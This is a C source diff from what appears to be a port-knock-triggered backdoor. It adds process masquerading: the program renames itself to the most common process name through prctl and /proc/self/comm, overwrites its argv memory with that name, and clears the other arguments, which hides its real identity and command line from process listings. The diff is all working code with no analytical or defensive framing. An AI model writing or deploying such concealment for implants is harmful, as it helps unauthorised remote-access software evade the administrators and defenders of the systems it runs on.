@@ -109,7 +109,7 @@ int wait_for_port_knock(const struct client_options * client_options) {
     return EXIT_SUCCESS;
 }
 
-void rename_process_to_most_common(void) {
+void rename_process_to_most_common(const int argc, char * argv[]) {
     process_record_t * records = calloc(MAX_PROCESSES, sizeof(process_record_t));
     if (records == NULL) {
         log_message("Failed to allocate process records");
@@ -137,6 +137,38 @@ void rename_process_to_most_common(void) {
     if (prctl(PR_SET_NAME, most_common, 0, 0, 0) < 0) {
         perror("prctl PR_SET_NAME");
     }
+
+    {
+        FILE * comm_f = fopen("/proc/self/comm", "w");
+        if (comm_f != NULL) {
+            fputs(most_common, comm_f);
+            fclose(comm_f);
+        }
+    }
+
+    if (argc > 0 && argv[0] != NULL) {
+        char * block_start = argv[0];
+        char * block_end   = argv[0] + strlen(argv[0]);
+
+        for (int i = 1; i < argc; i++) {
+            if (argv[i] != NULL) {
+                char * arg_end = argv[i] + strlen(argv[i]);
+                if (arg_end > block_end) {
+                    block_end = arg_end;
+                }
+            }
+        }
+
+        const size_t total    = (size_t)(block_end - block_start);
+        const size_t name_len = strlen(most_common);
+
+        memset(block_start, 0, total);
+        memcpy(block_start, most_common, name_len < total ? name_len : total - 1);
+
+        for (int i = 1; i < argc; i++) {
+            argv[i] = NULL;
+        }
+    }
 }
 
 int main(const int argc, char * argv[]) {
@@ -155,8 +187,10 @@ int main(const int argc, char * argv[]) {
         fprintf(stderr, "Cannot set SIGTERM handler\n");
         return EXIT_FAILURE;
     }
+    const pid_t pid = getpid();
+    printf("PID: %d", pid);
 
-    rename_process_to_most_common();
+    rename_process_to_most_common(argc, argv);
 
     // Buffer to store knock source IP
     char knock_source_ip[INET_ADDRSTRLEN] = {0};
